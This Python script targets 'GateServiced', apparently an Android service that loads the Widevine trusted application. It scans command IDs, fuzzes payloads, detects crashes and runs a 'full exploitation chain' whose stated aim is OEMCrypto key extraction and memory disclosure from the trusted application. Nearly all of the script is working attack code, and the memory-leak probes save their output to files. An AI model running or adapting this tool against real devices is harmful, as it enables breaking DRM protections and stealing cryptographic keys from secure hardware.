#!/usr/bin/env python3
"""
GateServiced EXEC Breakthrough — cmd_id = 0x00010002
=====================================================

ROOT CAUSE ANALYSIS:
  All previous EXEC probes used cmd_ids 0x00-0xFF.
  The REAL cmd_id for TA commands is in the 0x0001xxxx family:
    0x00010002 = dtxGetAppletInfo (version query)
    0x00010003 = LOAD_TA (handled by cmd_dispatch, never reaches TA)
    0x00010004 = UNLOAD_TA (handled by cmd_dispatch, never reaches TA)

  Assembly proof (run_load_ta @ 0x32C8-0x32E8):
    MOV  W0, #0x2           ; low half
    MOVK W0, #0x1, LSL #16  ; W0 = 0x00010002
    MOV  W2, #0x4            ; input_len = 4
    payload = 0x00000100     ; stored at SP+0x1c
    BL   run_exec_cmd_ta     ; → succeeds during LOAD!

  This cmd reaches the TA via DMA with magic 0x55, TA responds with 0xAA.
  All our 0x00-0xFF probes NEVER matched any TA command handler.

ATTACK PLAN:
  Phase A: Send cmd_id=0x00010002 + 4B payload 0x100 → expect version string
  Phase B: Scan 0x00010000-0x0001FFFF for other commands
  Phase C: Scan 0x00020000-0x000FFFFF for extended ranges
  Phase D: For each hit, fuzz payload to find exploitable operations
  Phase E: Attempt OEMCrypto key extraction / TA memory disclosure

Usage:
  adb forward tcp:8341 tcp:8341
  python3 gate_exec_breakthrough.py [--ip=IP] <mode>

  Modes:
    version    — Send the EXACT version query (0x10002 + 0x100)
    scan_1xxxx — Scan 0x10000-0x1FFFF cmd_id range
    scan_wide  — Scan 0x00000-0xFFFFF with smart stepping
    fuzz_ver   — Fuzz payload to version query cmd
    exploit    — Full exploitation chain
    all        — Run version + scan_1xxxx + fuzz_ver
"""

import socket
import struct
import sys
import time
import json

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════

TARGET_IP   = "127.0.0.1"
TARGET_PORT = 8341
TIMEOUT     = 5
WIDEVINE_PATH = b"/vendor/firmware_mnt/image/widevine.mbn\x00"

CMD_LOAD_TA    = 0x00010003
CMD_UNLOAD_TA  = 0x00010004
CMD_VERSION    = 0x00010002  # ← THE BREAKTHROUGH: dtxGetAppletInfo

# ══════════════════════════════════════════════════════════════
#  PROTOCOL
# ══════════════════════════════════════════════════════════════

def send_packet(cmd_id, payload=b"", timeout=None, verbose=True):
    """One-shot: connect → send → recv → close. Returns (response, elapsed_ms)."""
    t = timeout or TIMEOUT
    t0 = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(t)
        sock.connect((TARGET_IP, TARGET_PORT))

        header = struct.pack("<I", cmd_id)
        packet = header + payload

        if verbose:
            print(f"  [>] CMD 0x{cmd_id:08X} | Payload {len(payload)}B: {payload[:32].hex()}")

        t0 = time.monotonic()
        sock.sendall(packet)
        response = sock.recv(8192)
        elapsed = (time.monotonic() - t0) * 1000

        if verbose and response:
            print(f"  [<] {len(response)}B in {elapsed:.1f}ms")
            print(f"      Hex : {response[:80].hex()}")
            try:
                text = response.decode('utf-8', errors='replace')
                print(f"      Text: {text[:120]}")
            except:
                pass
        sock.close()
        return response, elapsed

    except socket.timeout:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else t * 1000
        if verbose:
            print(f"  [!] Timeout ({elapsed:.0f}ms)")
        try: sock.close()
        except: pass
        return None, elapsed

    except ConnectionResetError:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else 0
        if verbose:
            print(f"  [!!!] CONNECTION RESET — SERVICE CRASHED!")
        return b"RESET", elapsed

    except ConnectionRefusedError:
        if verbose:
            print(f"  [!!!] CONNECTION REFUSED — service down?")
        return b"REFUSED", elapsed if t0 else 0

    except Exception as e:
        elapsed = (time.monotonic() - t0) * 1000 if t0 else 0
        if verbose:
            print(f"  [!] Error: {e}")
        return None, elapsed


def send_persistent(sock, cmd_id, payload=b"", timeout=None, verbose=True):
    """Send on existing socket. Returns (response, elapsed_ms)."""
    t = timeout or TIMEOUT
    sock.settimeout(t)
    header = struct.pack("<I", cmd_id)
    packet = header + payload

    if verbose:
        print(f"  [>] CMD 0x{cmd_id:08X} | Payload {len(payload)}B: {payload[:32].hex()}")

    t0 = time.monotonic()
    try:
        sock.sendall(packet)
        response = sock.recv(8192)
        elapsed = (time.monotonic() - t0) * 1000

        if verbose and response:
            print(f"  [<] {len(response)}B in {elapsed:.1f}ms")
            print(f"      Hex : {response[:80].hex()}")
            try:
                text = response.decode('utf-8', errors='replace')
                print(f"      Text: {text[:120]}")
            except:
                pass
        return response, elapsed

    except socket.timeout:
        elapsed = (time.monotonic() - t0) * 1000
        if verbose:
            print(f"  [!] Timeout ({elapsed:.0f}ms)")
        return None, elapsed


def ensure_loaded(verbose=True):
    """Ensure widevine.mbn is loaded. Returns True on success."""
    if verbose:
        print("[*] Loading widevine.mbn...")
    resp, ms = send_packet(CMD_LOAD_TA, WIDEVINE_PATH, verbose=verbose)
    if resp and b"succeed" in resp:
        if verbose:
            print(f"    ✓ TA loaded ({ms:.1f}ms)")
        return True
    elif resp and b"already" in resp:
        if verbose:
            print(f"    ✓ TA already loaded ({ms:.1f}ms)")
        return True
    else:
        if verbose:
            print(f"    ✗ LOAD FAILED: {resp}")
        return False


# ══════════════════════════════════════════════════════════════
#  MODE A: VERSION QUERY — The Proof of Concept
# ══════════════════════════════════════════════════════════════

def mode_version():
    """Send the EXACT version query used internally by run_load_ta."""
    print("=" * 70)
    print("MODE: VERSION QUERY (cmd_id=0x00010002, payload=0x00000100)")
    print("=" * 70)
    print()
    print("This is the EXACT command run_load_ta uses at offset 0x32E8")
    print("to call dtxGetAppletInfo after loading the TA binary.")
    print("If the TA is loaded, this MUST return a response.")
    print()

    # Step 1: Ensure TA is loaded
    if not ensure_loaded():
        print("[FATAL] Cannot load TA. Aborting.")
        return False

    print()
    time.sleep(0.5)

    # Step 2: Send the version query
    print("[*] Sending version query: cmd_id=0x00010002, payload=0x00000100")
    payload = struct.pack("<I", 0x100)  # 4 bytes: 0x00, 0x01, 0x00, 0x00
    resp, ms = send_packet(CMD_VERSION, payload, timeout=10)

    print()
    if resp and resp != b"RESET":
        print("★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★")
        print("★  EXEC BREAKTHROUGH! TA RESPONDED!                ★")
        print("★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★")
        print(f"  Response length: {len(resp)} bytes")
        print(f"  Response time:   {ms:.1f}ms")
        print(f"  Hex dump:        {resp.hex()}")
        try:
            print(f"  Text:            {resp.decode('utf-8', errors='replace')}")
        except:
            pass
        print()

        # Try to interpret as version string
        # The TA response in DMA is: [0xAA][resp_len:8B][data @ 0x09]
        # But GateServiced copies just the data portion to TCP output
        # So resp should be the raw version string
        print("[*] Interpreting as TA version info:")
        print(f"    Raw: {resp}")
        if len(resp) > 4:
            print(f"    Possible version string: {resp[4:].decode('utf-8', errors='replace')}")
        return True
    elif resp == b"RESET":
        print("[!!!] Service CRASHED on version query!")
        print("      This is interesting — might be exploitable via crash analysis")
        return False
    else:
        print("[!] Version query TIMED OUT.")
        print("    This is unexpected — the internal call succeeds during LOAD.")
        print("    Possible causes:")
        print("    1. DMA state changed after LOAD completed")
        print("    2. g_dma_ptr was freed/invalidated")
        print("    3. TA was unloaded internally")
        print()

        # Try with different payload sizes
        print("[*] Trying payload variations...")
        for plen, pval, desc in [
            (0,  b"",                      "empty payload"),
            (4,  b"\x00\x00\x00\x00",     "4B zeros"),
            (8,  struct.pack("<Q", 0x100), "8B 0x100"),
            (4,  struct.pack("<I", 1),     "4B value=1"),
            (4,  struct.pack("<I", 2),     "4B value=2"),
            (4,  struct.pack("<I", 0),     "4B value=0"),
            (8,  b"\x00" * 8,             "8B zeros"),
            (16, b"\x00" * 16,            "16B zeros"),
        ]:
            print(f"\n  [{desc}]")
            r, m = send_packet(CMD_VERSION, pval, timeout=3, verbose=True)
            if r and r != b"RESET":
                print(f"    ★★★ GOT RESPONSE with {desc}!")
                return True
            time.sleep(0.3)

        return False


# ══════════════════════════════════════════════════════════════
#  MODE B: SCAN 0x0001xxxx RANGE
# ══════════════════════════════════════════════════════════════

def mode_scan_1xxxx():
    """Scan cmd_ids in the 0x00010000-0x0001FFFF range."""
    print("=" * 70)
    print("MODE: SCAN 0x0001xxxx CMD_ID RANGE")
    print("=" * 70)
    print()

    if not ensure_loaded():
        print("[FATAL] Cannot load TA. Aborting.")
        return

    hits = []
    resets = []

    # Primary scan: 0x10000-0x10FFF (most likely range)
    # Skip 0x10003 (LOAD) and 0x10004 (UNLOAD) — handled by cmd_dispatch
    print("[*] Scanning 0x00010000 - 0x00010FFF (skip LOAD/UNLOAD)...")
    print()

    payload_4 = struct.pack("<I", 0x100)  # default 4B payload

    for cmd_id in range(0x10000, 0x10100):  # First 256 in range
        if cmd_id in (CMD_LOAD_TA, CMD_UNLOAD_TA):
            continue

        tag = f"0x{cmd_id:08X}"
        resp, ms = send_packet(cmd_id, payload_4, timeout=2, verbose=False)

        if resp == b"RESET":
            print(f"  [!!!] CRASH at cmd_id={tag}")
            resets.append(cmd_id)
            time.sleep(2)  # wait for service restart
            ensure_loaded(verbose=False)
        elif resp is not None:
            print(f"  [★] HIT at cmd_id={tag}: {len(resp)}B in {ms:.1f}ms")
            print(f"       Hex: {resp[:60].hex()}")
            try:
                print(f"       Text: {resp.decode('utf-8', errors='replace')[:80]}")
            except:
                pass
            hits.append((cmd_id, resp, ms))
        else:
            # Timeout — no response
            if cmd_id % 32 == 0:
                sys.stdout.write(f"  ... scanning 0x{cmd_id:08X}\r")
                sys.stdout.flush()

        time.sleep(0.1)

    print()

    # Extended scan: 0x10100-0x10FFF (step by 16 for speed)
    print("[*] Extended scan 0x00010100 - 0x00010FFF (step=16)...")
    for cmd_id in range(0x10100, 0x11000, 16):
        if cmd_id in (CMD_LOAD_TA, CMD_UNLOAD_TA):
            continue

        resp, ms = send_packet(cmd_id, payload_4, timeout=1.5, verbose=False)
        if resp == b"RESET":
            print(f"  [!!!] CRASH at 0x{cmd_id:08X}")
            resets.append(cmd_id)
            time.sleep(2)
            ensure_loaded(verbose=False)
        elif resp is not None:
            print(f"  [★] HIT at 0x{cmd_id:08X}: {len(resp)}B")
            hits.append((cmd_id, resp, ms))

        time.sleep(0.05)

    # Summary
    print()
    print("=" * 50)
    print(f"SCAN RESULTS: {len(hits)} hits, {len(resets)} crashes")
    print("=" * 50)
    for cmd_id, resp, ms in hits:
        print(f"  0x{cmd_id:08X}: {len(resp)}B in {ms:.1f}ms — {resp[:40].hex()}")
    for cmd_id in resets:
        print(f"  0x{cmd_id:08X}: CRASH!")

    return hits, resets


# ══════════════════════════════════════════════════════════════
#  MODE C: WIDE SCAN (0x00000-0xFFFFF, smart stepping)
# ══════════════════════════════════════════════════════════════

def mode_scan_wide():
    """Scan wider cmd_id ranges with adaptive stepping."""
    print("=" * 70)
    print("MODE: WIDE CMD_ID SCAN (0x00000-0xFFFFF)")
    print("=" * 70)
    print()

    if not ensure_loaded():
        print("[FATAL] Cannot load TA. Aborting.")
        return

    hits = []
    resets = []
    payload = struct.pack("<I", 0x100)

    # Scan each 0x000Nxxxx block (N=0-F), step=256 first pass
    for block in range(0x10):
        if block == 1:
            continue  # already covered by mode_scan_1xxxx

        base = block << 16
        print(f"\n[*] Block 0x{block:X}xxxx (0x{base:08X}-0x{base+0xFFFF:08X}, step=256)...")

        for cmd_id in range(base, base + 0x10000, 256):
            if cmd_id in (CMD_LOAD_TA, CMD_UNLOAD_TA):
                continue

            resp, ms = send_packet(cmd_id, payload, timeout=1.5, verbose=False)

            if resp == b"RESET":
                print(f"  [!!!] CRASH at 0x{cmd_id:08X}")
                resets.append(cmd_id)
                time.sleep(2)
                ensure_loaded(verbose=False)
            elif resp is not None:
                print(f"  [★] HIT at 0x{cmd_id:08X}: {len(resp)}B in {ms:.1f}ms")
                hits.append((cmd_id, resp, ms))
                # Found a hit — scan nearby with step=1
                print(f"      Scanning nearby 0x{max(0,cmd_id-16):08X}-0x{cmd_id+16:08X}...")
                for nearby in range(max(0, cmd_id - 16), cmd_id + 16):
                    if nearby == cmd_id or nearby in (CMD_LOAD_TA, CMD_UNLOAD_TA):
                        continue
                    r2, m2 = send_packet(nearby, payload, timeout=1.5, verbose=False)
                    if r2 and r2 != b"RESET":
                        print(f"      [★] Nearby hit 0x{nearby:08X}: {len(r2)}B")
                        hits.append((nearby, r2, m2))
                    time.sleep(0.05)

            time.sleep(0.02)

    print()
    print("=" * 50)
    print(f"WIDE SCAN: {len(hits)} hits, {len(resets)} crashes")
    print("=" * 50)
    for cmd_id, resp, ms in hits:
        print(f"  0x{cmd_id:08X}: {len(resp)}B — {resp[:40].hex()}")

    return hits, resets


# ══════════════════════════════════════════════════════════════
#  MODE D: FUZZ VERSION QUERY PAYLOAD
# ══════════════════════════════════════════════════════════════

def mode_fuzz_ver():
    """Fuzz the payload to the version query command."""
    print("=" * 70)
    print("MODE: FUZZ VERSION QUERY (cmd_id=0x00010002)")
    print("=" * 70)
    print()

    if not ensure_loaded():
        print("[FATAL] Cannot load TA. Aborting.")
        return

    hits = []

    # Test various payload values with cmd_id=0x10002
    print("[*] Testing payload variations for version query...")
    print()

    payloads = [
        # (description, payload_bytes)
        ("Standard 0x100",     struct.pack("<I", 0x100)),
        ("Empty",              b""),
        ("1B zero",            b"\x00"),
        ("4B zeros",           b"\x00\x00\x00\x00"),
        ("4B value=1",         struct.pack("<I", 1)),
        ("4B value=2",         struct.pack("<I", 2)),
        ("4B value=0xFF",      struct.pack("<I", 0xFF)),
        ("4B value=0x200",     struct.pack("<I", 0x200)),
        ("4B value=0x400",     struct.pack("<I", 0x400)),
        ("4B value=0x1000",    struct.pack("<I", 0x1000)),
        ("4B value=0xFFFF",    struct.pack("<I", 0xFFFF)),
        ("4B value=0xFFFFFFFF",struct.pack("<I", 0xFFFFFFFF)),
        ("8B 0x100 as uint64", struct.pack("<Q", 0x100)),
        ("8B zeros",           b"\x00" * 8),
        ("16B zeros",          b"\x00" * 16),
        ("32B zeros",          b"\x00" * 32),
        ("64B zeros",          b"\x00" * 64),
        ("128B zeros",         b"\x00" * 128),
        ("256B zeros",         b"\x00" * 256),
        ("4B value=0x5000",    struct.pack("<I", 0x5000)),
        ("Large: 1024B",       b"\x00" * 1024),
        ("Large: 4096B",       b"\x00" * 4096),
        # OEMCrypto-style structures
        ("OEMCrypto hdr v1",   struct.pack("<IIII", 1, 0, 0, 0)),
        ("OEMCrypto hdr v14",  struct.pack("<IIII", 14, 0, 0, 0)),
        ("OEMCrypto hdr v16",  struct.pack("<IIII", 16, 0, 0, 0)),
    ]

    for desc, payload in payloads:
        print(f"  [{desc}] ({len(payload)}B)")
        resp, ms = send_packet(CMD_VERSION, payload, timeout=3, verbose=False)

        if resp == b"RESET":
            print(f"    [!!!] CRASH with payload: {desc}")
            hits.append(("CRASH", desc, payload, None, ms))
            time.sleep(2)
            ensure_loaded(verbose=False)
        elif resp is not None:
            print(f"    [★] RESPONSE: {len(resp)}B in {ms:.1f}ms")
            print(f"        Hex: {resp[:60].hex()}")
            try:
                print(f"        Text: {resp.decode('utf-8', errors='replace')[:80]}")
            except:
                pass
            hits.append(("HIT", desc, payload, resp, ms))
        else:
            pass  # timeout, expected for invalid payloads

        time.sleep(0.2)

    print()
    print("=" * 50)
    print(f"FUZZ RESULTS: {len(hits)} responses")
    print("=" * 50)
    for kind, desc, payload, resp, ms in hits:
        if kind == "HIT":
            print(f"  ✓ {desc}: {len(resp)}B — {resp[:40].hex()}")
        else:
            print(f"  ✗ {desc}: CRASH!")

    return hits


# ══════════════════════════════════════════════════════════════
#  MODE E: FULL EXPLOITATION CHAIN
# ══════════════════════════════════════════════════════════════

def mode_exploit():
    """Full exploitation: version → scan → fuzz → extract."""
    print("=" * 70)
    print("MODE: FULL EXPLOITATION CHAIN")
    print("=" * 70)
    print()

    # Step 1: Load and version query
    print("━━━ Step 1: Load TA + Version Query ━━━")
    if not ensure_loaded():
        print("[FATAL] Cannot proceed without loaded TA.")
        return

    payload = struct.pack("<I", 0x100)
    ver_resp, ver_ms = send_packet(CMD_VERSION, payload, timeout=10)

    if ver_resp and ver_resp != b"RESET":
        print(f"\n[★] Version response: {ver_resp.hex()}")
        print(f"    Text: {ver_resp.decode('utf-8', errors='replace')}")
    else:
        print("[!] Version query failed — TA might need special EXEC state")
        print("[*] Trying persistent socket approach...")
        print()

        # Try persistent: LOAD + VERSION on same socket
        print("━━━ Step 1b: Persistent Socket ━━━")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((TARGET_IP, TARGET_PORT))

            # LOAD on this socket
            r1, m1 = send_persistent(sock, CMD_LOAD_TA, WIDEVINE_PATH)
            if r1 and b"succeed" in r1:
                print(f"    ✓ LOAD on persistent socket: {m1:.1f}ms")

                time.sleep(0.3)

                # VERSION on same socket
                r2, m2 = send_persistent(sock, CMD_VERSION, payload)
                if r2:
                    print(f"    ★ VERSION on same socket: {len(r2)}B in {m2:.1f}ms")
                    print(f"      {r2.hex()}")
                    ver_resp = r2
                else:
                    print(f"    ✗ VERSION timeout on same socket")

                    # Try EXEC with different cmd_ids on this socket
                    print("\n[*] Trying nearby cmd_ids on persistent socket...")
                    for test_cmd in [0x10000, 0x10001, 0x10002, 0x10005,
                                     0x10006, 0x10007, 0x10008,
                                     0x20000, 0x20001, 0x20002]:
                        r3, m3 = send_persistent(sock, test_cmd, payload, timeout=2)
                        if r3:
                            print(f"    ★ HIT: 0x{test_cmd:08X} → {len(r3)}B in {m3:.1f}ms")
                            print(f"      {r3[:40].hex()}")
                        time.sleep(0.2)

            sock.close()
        except Exception as e:
            print(f"    Error: {e}")

    # Step 2: If version worked, probe exploitable commands
    if ver_resp and ver_resp != b"RESET" and ver_resp is not None:
        print()
        print("━━━ Step 2: Exploitable Command Discovery ━━━")
        print()

        # Try commands that might leak memory or accept dangerous input
        exploit_cmds = [
            # (cmd_id, payload, description)
            (CMD_VERSION, b"\xff" * 4, "Version with max payload value"),
            (CMD_VERSION, b"\x00" * 20000, "Version with oversized payload"),
            (0x10001, payload, "cmd 0x10001 — possible admin/debug"),
            (0x10000, payload, "cmd 0x10000 — possible init"),
            (0x10005, payload, "cmd 0x10005 — possible read"),
            (0x10006, payload, "cmd 0x10006 — possible write"),
            (0x10007, payload, "cmd 0x10007 — possible config"),
            (0x10008, payload, "cmd 0x10008 — possible status"),
            (0x10009, payload, "cmd 0x10009 — possible debug"),
            (0x1000A, payload, "cmd 0x1000A — possible memory"),
        ]

        for cmd_id, pld, desc in exploit_cmds:
            print(f"  [{desc}]")
            r, m = send_packet(cmd_id, pld, timeout=3, verbose=False)
            if r and r != b"RESET":
                print(f"    ★ RESPONSE: {len(r)}B in {m:.1f}ms — {r[:40].hex()}")
            elif r == b"RESET":
                print(f"    ✗ CRASH! Exploitable?")
                time.sleep(2)
                ensure_loaded(verbose=False)
            time.sleep(0.2)

    # Step 3: Memory disclosure attempts
    print()
    print("━━━ Step 3: Memory Disclosure Probes ━━━")
    print()
    # Try to read back more data than we sent by manipulating input_len
    # The DMA request has input_len field — if TA trusts it, we might
    # get adjacent memory in the response

    if not ensure_loaded(verbose=False):
        return

    # Send version query but with various "size" hints in payload
    size_probes = [
        struct.pack("<I", 0x5000),      # request 20KB output
        struct.pack("<I", 0x10000),     # request 64KB
        struct.pack("<II", 0x100, 0x5000),  # two size fields
        struct.pack("<III", 0x100, 0, 0x5000),
    ]

    for i, probe in enumerate(size_probes):
        print(f"  [Size probe {i+1}: {probe.hex()}]")
        r, m = send_packet(CMD_VERSION, probe, timeout=3, verbose=False)
        if r and len(r) > 100:
            print(f"    ★★★ LARGE RESPONSE: {len(r)}B — possible memory leak!")
            print(f"        First 80B: {r[:80].hex()}")
            # Save to file
            fname = f"memleak_probe{i+1}.bin"
            with open(fname, "wb") as f:
                f.write(r)
            print(f"        Saved to {fname}")
        elif r:
            print(f"    Response: {len(r)}B — {r[:40].hex()}")
        time.sleep(0.3)


# ══════════════════════════════════════════════════════════════
#  MODE F: PERSISTENT SOCKET MULTI-COMMAND
# ══════════════════════════════════════════════════════════════

def mode_persistent():
    """Test EXEC commands on the SAME socket as LOAD."""
    print("=" * 70)
    print("MODE: PERSISTENT SOCKET (LOAD + EXEC on same connection)")
    print("=" * 70)
    print()
    print("Theory: Maybe DMA/appObj state is per-connection in some way.")
    print("We LOAD + EXEC on the SAME socket to ensure state continuity.")
    print()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((TARGET_IP, TARGET_PORT))
        print("[*] Connected to GateServiced")

        # LOAD
        r1, m1 = send_persistent(sock, CMD_LOAD_TA, WIDEVINE_PATH)
        if not r1 or b"succeed" not in r1:
            print("[!] LOAD failed on persistent socket")
            sock.close()
            return
        print(f"    ✓ LOAD succeeded ({m1:.1f}ms)\n")

        time.sleep(0.5)

        # VERSION QUERY — the key test
        print("[*] VERSION QUERY on same socket:")
        payload = struct.pack("<I", 0x100)
        r2, m2 = send_persistent(sock, CMD_VERSION, payload, timeout=10)
        if r2:
            print(f"\n★★★ VERSION RESPONSE ON SAME SOCKET! ★★★")
            print(f"    {len(r2)}B in {m2:.1f}ms")
            print(f"    Hex: {r2.hex()}")
            print(f"    Text: {r2.decode('utf-8', errors='replace')}")
        else:
            print(f"    ✗ Timeout ({m2:.0f}ms)")

        time.sleep(0.3)

        # If version worked, scan more on same socket
        if r2:
            print("\n[*] Scanning more cmd_ids on same socket...")
            for test_cmd in range(0x10000, 0x10020):
                if test_cmd in (CMD_LOAD_TA, CMD_UNLOAD_TA, CMD_VERSION):
                    continue
                r3, m3 = send_persistent(sock, test_cmd, payload, timeout=2)
                if r3:
                    print(f"    ★ 0x{test_cmd:08X}: {len(r3)}B in {m3:.1f}ms")
                time.sleep(0.1)
        else:
            # Version failed — try other cmd_ids
            print("\n[*] Version failed, trying other cmd_ids...")
            for test_cmd in [0x10000, 0x10001, 0x10005, 0x10006,
                             0x20001, 0x20002, 0x30001, 0x40001,
                             1, 2, 3, 4, 5, 0x100, 0x200]:
                r3, m3 = send_persistent(sock, test_cmd, payload, timeout=2)
                if r3:
                    print(f"    ★ 0x{test_cmd:08X}: {len(r3)}B in {m3:.1f}ms")
                    print(f"      {r3[:40].hex()}")
                time.sleep(0.2)

        sock.close()
    except Exception as e:
        print(f"[!] Error: {e}")


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main():
    global TARGET_IP

    args = sys.argv[1:]

    # Parse --ip
    for a in args:
        if a.startswith("--ip="):
            TARGET_IP = a.split("=", 1)[1]
            args.remove(a)
            break

    if not args:
        print(__doc__)
        sys.exit(1)

    mode = args[0].lower()

    print(f"\n[Config] Target: {TARGET_IP}:{TARGET_PORT}")
    print()

    if mode == "version":
        mode_version()
    elif mode == "scan_1xxxx":
        mode_scan_1xxxx()
    elif mode == "scan_wide":
        mode_scan_wide()
    elif mode == "fuzz_ver":
        mode_fuzz_ver()
    elif mode == "exploit":
        mode_exploit()
    elif mode == "persistent":
        mode_persistent()
    elif mode == "all":
        # Run version first, then scan, then fuzz
        success = mode_version()
        print("\n" + "=" * 70 + "\n")
        mode_scan_1xxxx()
        print("\n" + "=" * 70 + "\n")
        mode_fuzz_ver()
    else:
        print(f"Unknown mode: {mode}")
        print("Available: version, scan_1xxxx, scan_wide, fuzz_ver, exploit, persistent, all")
        sys.exit(1)


if __name__ == "__main__":
    main()
